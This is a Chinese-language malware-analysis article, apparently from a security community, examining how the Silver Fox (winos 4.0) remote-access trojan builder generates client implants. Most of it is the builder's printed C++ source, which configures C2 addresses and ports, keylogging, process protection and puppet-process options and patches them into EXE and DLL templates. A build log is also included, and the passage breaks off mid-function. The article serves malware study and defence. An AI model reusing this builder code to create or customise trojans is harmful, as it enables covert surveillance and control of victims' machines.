---
title: 银狐 winos 4.0 源码分析：客户端生成流程
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458588408&idx=2&sn=2cc1b785549080be7e87d04f759e653c&chksm=b18c247286fbad6409346e13f98f93ab227210f678d404d0111c3b7ca5ab1fa313a5daada6d0&scene=58&subscene=0#rd
source: 看雪学苑
date: 2025-01-09
fetch_date: 2025-10-06T20:10:48.200681
---

# 银狐 winos 4.0 源码分析：客户端生成流程

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HqoESibexDGWPrtDd2WnUF5o0vEcwV4Gia4nQ00pSO7tbicNsLea90p7vEHia9aW4Zn4MnkqTPOthe8A/0?wx_fmt=jpeg)

# 银狐 winos 4.0 源码分析：客户端生成流程

bwner

看雪学苑

最近在学习木马分析，网上关于银狐的源码分析目前还没看到，挖个坑学一学银狐（winos 4.0）的源码。

```
一

核心函数
```

`客户生成/BuildDlg.cpp`是生成客户端的窗口类(CBuildDlg)的实现代码，是由下面几个函数实现客户端的生成：

```
void OnBnClickedBuildexe() // 生成EXE文件
void OnBnClickedBuilddll() // 生成DLL文件
void OnBnClickedBuildShellcode() // 生成Shellcode
void OnBnClickedBuildPowershell() // 生成PowerShell脚本，PowerShell生成方式只使用第一组服务器配置。
```

生成过程由`CBuildDlg::build`函数进行控制，被上面几个函数进行调用，此处为核心代码：

```
BOOL CBuildDlg::build(int mode)
{
    UpdateData(TRUE);
    CFileDialog dlg(FALSE, _T(""), _T("output"), OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, _T("可执行文件(*.*)| All Files (*.*) |*.*||"), NULL);
    if (dlg.DoModal() != IDOK)
    {
        m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("已取消生成\r\n"));
        return FALSE;
    }
    CString path;
    if (mode == 0)
    {
        if (!getsettingdata())
        {
            m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("初始化参数失败\r\n"));
            return FALSE;
        }
        path = _T("\\Plugins\\x86\\上线模块.bin");
        swprintf_s(writepath, _T("%s_86.exe"), dlg.GetPathName());
        if (!changedataandwritefile(path))
        {
            m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("x86  exe 生成失败\r\n"));
            return FALSE;
        }
        path = _T("\\Plugins\\x64\\上线模块.bin");
        swprintf_s(writepath, _T("%s_64.exe"), dlg.GetPathName());
        if (!changedataandwritefile(path))
        {
            m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("x64  exe 生成失败\r\n"));
            return FALSE;
        }
    }
    if (mode == 1)
    {
        if (MessageBox(_T("Dll加载运行DllMain吗？"), _T("加载执行"), MB_OKCANCEL) == IDOK)
        {
            MyInfo.otherset.RunDllEntryProc = true;
        }
        else
        {
            MyInfo.otherset.RunDllEntryProc = false;
        }
        if (!getsettingdata())
        {
            m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("初始化参数失败\r\n"));
            return FALSE;
        }
        path = _T("\\Plugins\\x86\\上线模块.dll");
        swprintf_s(writepath, _T("%s_86.dll"), dlg.GetPathName());
        if (!changedataandwritefile(path, TRUE))
        {
            m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("x86  dll 生成失败\r\n"));
            return FALSE;
        }
        path = _T("\\Plugins\\x64\\上线模块.dll");
        swprintf_s(writepath, _T("%s_64.dll"), dlg.GetPathName());
        if (!changedataandwritefile(path, TRUE))
        {
            m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("x64  exe 生成失败\r\n"));
            return FALSE;
        }
    }
    return TRUE;

}
```

整体流程为：

1.获取保存路径

2.获取配置信息`getsettingdata()`

3.读取模板文件(.bin或.dll)

4.修改配置数据

5.写入新文件

其中获取配置信息的`getsettingdata()`函数尤为重要，配置信息由客户端界面进行设置，部分为默认值：

```
BOOL CBuildDlg::getsettingdata()
{
    UpdateData(TRUE);
    m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("初始化参数\r\n"));

    _tcscpy_s(MyInfo.szAddress, m_edit_ip.GetBuffer(0));
    _tcscpy_s(MyInfo.szPort, m_edit_port.GetBuffer(0));
    MyInfo.IsTcp = h_combo_net.GetCurSel() ? false : true;

    _tcscpy_s(MyInfo.szAddress2, m_edit_ip2.GetBuffer(0));
    _tcscpy_s(MyInfo.szPort2, m_edit_port2.GetBuffer(0));
    MyInfo.IsTcp2 = h_combo_net2.GetCurSel() ? false : true;

    _tcscpy_s(MyInfo.szAddress3, m_edit_ip3.GetBuffer(0));
    _tcscpy_s(MyInfo.szPort3, m_edit_port3.GetBuffer(0));
    MyInfo.IsTcp3 = h_combo_net3.GetCurSel() ? false : true;

    _tcscpy_s(MyInfo.szRunSleep, m_edit_first_time.GetBuffer(0));
    _tcscpy_s(MyInfo.szHeart, m_edit_rest_time.GetBuffer(0));
    _tcscpy_s(MyInfo.Remark, m_edit_v.GetBuffer(0));
    _tcscpy_s(MyInfo.szGroup, m_edit_g.GetBuffer(0));

    MyInfo.otherset.IsKeyboard = (((CButton*)GetDlgItem(IDC_CHECK_KEYBOARD))->GetCheck()) ? true : false;
    MyInfo.otherset.antinet = (((CButton*)GetDlgItem(IDC_CHECK_NET))->GetCheck()) ? true : false;
    MyInfo.otherset.Processdaemon = (((CButton*)GetDlgItem(IDC_CHECK_PROCESSDAEMON))->GetCheck()) ? true : false;
    MyInfo.otherset.ProtectedProcess = (((CButton*)GetDlgItem(IDC_CHECK_PROTEXTEDPROCESS))->GetCheck()) ? true : false;
    MyInfo.otherset.puppet = (((CButton*)GetDlgItem(IDC_CHECK_PUPPET))->GetCheck()) ? true : false;

    CString s = confimodel;
    Setfindinfo(s, _T("地址1"), MyInfo.szAddress, NULL);
    Setfindinfo(s, _T("端口1"), MyInfo.szPort, NULL);
    Setfindinfo(s, _T("通信1"), NULL, MyInfo.IsTcp);

    Setfindinfo(s, _T("地址2"), MyInfo.szAddress2, NULL);
    Setfindinfo(s, _T("端口2"), MyInfo.szPort2, NULL);
    Setfindinfo(s, _T("通信2"), NULL, MyInfo.IsTcp2);

    Setfindinfo(s, _T("地址3"), MyInfo.szAddress3, NULL);
    Setfindinfo(s, _T("端口3"), MyInfo.szPort3, NULL);
    Setfindinfo(s, _T("通信3"), NULL, MyInfo.IsTcp3);

    Setfindinfo(s, _T("等待"), MyInfo.szRunSleep, NULL);
    Setfindinfo(s, _T("重连"), MyInfo.szHeart, NULL);
    Setfindinfo(s, _T("分组"), MyInfo.szGroup, NULL);
    Setfindinfo(s, _T("版本"), MyInfo.szVersion, NULL);
    Setfindinfo(s, _T("备注"), MyInfo.Remark, NULL);

    Setfindinfo(s, _T("键盘"), NULL, MyInfo.otherset.IsKeyboard);
    Setfindinfo(s, _T("保护"), NULL, MyInfo.otherset.ProtectedProcess);
    Setfindinfo(s, _T("流量"), NULL, MyInfo.otherset.antinet);
    Setfindinfo(s, _T("入口"), NULL, MyInfo.otherset.RunDllEntryProc);
    Setfindinfo(s, _T("守护"), NULL, MyInfo.otherset.Processdaemon);
    Setfindinfo(s, _T("傀儡"), NULL, MyInfo.otherset.puppet);
    Setfindinfo(s, _T("特别"), NULL, MyInfo.otherset.special);
    s.MakeReverse();
    ZeroMemory(confi, 1000 * 2);
    memcpy(confi, s.GetBuffer(), s.GetLength() * 2 + 2);
    return TRUE;

}
```

#

```
二

生成exe
```

##

生成客户端（exe）的日志如下：

```
开始生成.
初始化参数
读取文件C:\Users\root\Desktop\新建文件夹\Plugins\x86\上线模块.bin
修改配置信息
写出成功C:\Users\root\Desktop\新建文件夹\output_86.exe
读取文件C:\Users\root\Desktop\新建文件夹\Plugins\x64\上线模块.bin
修改配置信息
写出成功C:\Users\root\Desktop\新建文件夹\output_64.exe
生成成功
```

其中`上线模块.bin -> output_64.exe`流程由`CBuildDlg::changedataandwritefile()`函数控制，具体流程为：

1.读取bin文件内容（上线模块.bin）

2.在内存中查找和替换配置信息

3.以exe扩展名写出文件

```
BOOL CBuildDlg::changedataandwritefile(CString path, BOOL bchangeexport)
{
    TCHAR DatPath[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, DatPath, sizeof(DatPath));
    *_tcsrchr(DatPath, _T('\\')) = '\0';
    CString path_data;
    path_data = DatPath;
    path_data += path;

    WIN32_FIND_DATA FindData;
    HANDLE hFile;
    hFile = FindFirstFile(path_data, &FindData);
    if (hFile == INVALID_HANDLE_VALUE) { m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("文件不存在")); m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)path_data.GetBuffer());  m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("\r\n"));  return FALSE; }
    FindClose(hFile);

    m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("读取文件")); 	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)path_data.GetBuffer());  m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("\r\n"));
    hFile = CreateFile(path_data, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("读取文件失败")); 	m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)path_data.GetBuffer());  m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("\r\n"));
        return FALSE;
    }
    DWORD len = GetFileSize(hFile, NULL);
    char* str = new char[len];
    ZeroMemory(str, sizeof(str));
    DWORD wr = 0;
    ReadFile(hFile, str, len, &wr, NULL);
    CloseHandle(hFile);
    m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("修改配置信息\r\n"));
    DWORD dwOffset = -1;
    dwOffset = memfind(str, _T("xiugaishiyong"), len, 0);

    if (dwOffset == -1)											 //无法修改配置信息就退出
    {

        m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("找不到上线配置标记 \r\n"));
        m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)path_data.GetBuffer());
        m_edit_tip.SendMessage(EM_REPLACE...